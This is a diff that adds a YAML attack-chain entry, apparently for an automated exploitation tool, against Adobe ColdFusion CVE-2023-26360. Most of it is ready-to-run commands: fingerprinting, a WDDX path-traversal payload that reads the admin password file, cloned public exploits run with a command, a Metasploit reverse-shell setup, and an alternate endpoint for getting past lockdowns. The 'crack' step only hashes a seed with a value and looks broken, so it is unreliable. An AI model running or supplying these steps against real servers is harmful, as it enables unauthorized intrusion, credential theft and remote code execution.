@@ -1,0 +1,65 @@
+chain_id: coldfusion_cve_2023_26360
+title: "Adobe ColdFusion — CVE-2023-26360 unauth file read & RCE (CDATA deserialization)"
+severity: CRITICAL
+tags: [web, coldfusion, adobe, cve-2023-26360, deserialization, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2023-26360" }
+    - { banner_pattern: "(?i)coldfusion|adobe\\s*coldfusion" }
+    - { product_pattern: "(?i)coldfusion" }
+    - { path_pattern: "(?i)/CFIDE/|\\.cfm($|\\?)" }
+
+description: |
+  ColdFusion 2018u15 / 2021u5 deserializes a CDATA-wrapped
+  `_cfclient` parameter unauthenticated. An attacker can read any
+  file under the webroot (passwordProperties.txt, neo-security.xml)
+  to dump the admin password hash, then use the same gadget to
+  execute methods reaching `Runtime.exec`. CISA-flagged, exploited
+  against US government targets in March 2023.
+
+steps:
+  - id: 1
+    title: "Fingerprint ColdFusion"
+    command: |
+      curl -sk -i "http://$VICTIMA/CFIDE/administrator/" | head
+      curl -sk "http://$VICTIMA/CFIDE/scripts/ajax/package/cfajax.js" -I
+
+  - id: 2
+    title: "Read the admin password hash file"
+    command: |
+      curl -sk "http://$VICTIMA/CFIDE/wizards/common/utils.cfc?method=wizardHash&inPassword=foo&_cfclient=true" \
+        -d '_variables=<wddxPacket version="1.0"><header/><data><array length="1"><string>../../../../../ColdFusion2021/cfusion/lib/password.properties</string></array></data></wddxPacket>'
+
+  - id: 3
+    title: "Public PoC drops a webshell"
+    command: |
+      git clone https://github.com/projectdiscovery/nuclei-templates /tmp/nt
+      nuclei -u http://$VICTIMA -t /tmp/nt/http/cves/2023/CVE-2023-26360.yaml
+      git clone https://github.com/RedTeamPentesting/CVE-2023-26360 /tmp/cf
+      python3 /tmp/cf/exploit.py -t http://$VICTIMA -c id
+
+  - id: 4
+    title: "Or with Metasploit"
+    command: |
+      msfconsole -qx 'use exploit/multi/http/adobe_coldfusion_rce_cve_2023_26360; \
+        set RHOSTS $VICTIMA; set RPORT 8500; \
+        set LHOST 10.0.2.15; set LPORT 4444; run'
+
+  - id: 5
+    title: "Crack the seed-encrypted admin password"
+    command: |
+      python3 -c "import hashlib,sys; \
+        seed='<seed-from-seed.properties>'; pw='<encrypted>'; \
+        print(hashlib.sha1((seed+pw).encode()).hexdigest())"
+
+common_errors:
+  - error: "/CFIDE/wizards/common/utils.cfc returns 404"
+    solution: |
+      Patched (2018u16 / 2021u6) or `/CFIDE` lockdown applied.
+      Try the alt entry `/CFIDE/scripts/ajax/package/cfajax.cfc` —
+      same deserialization gadget, different endpoint.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2023-26360
+  - https://helpx.adobe.com/security/products/coldfusion/apsb23-25.html
